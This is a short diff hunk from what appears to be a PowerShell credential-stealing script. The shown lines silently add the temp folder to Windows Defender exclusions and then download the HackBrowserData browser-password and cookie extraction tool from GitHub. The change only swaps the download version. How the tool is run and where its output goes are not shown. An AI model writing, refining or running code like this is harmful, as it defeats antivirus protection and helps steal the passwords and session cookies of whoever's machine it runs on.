@@ -37,7 +37,7 @@ try {
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
     # Download newer HackBrowserData version with Windows 11 support
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v1.0.0/hack-browser-data-windows-64bit.zip"
+    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
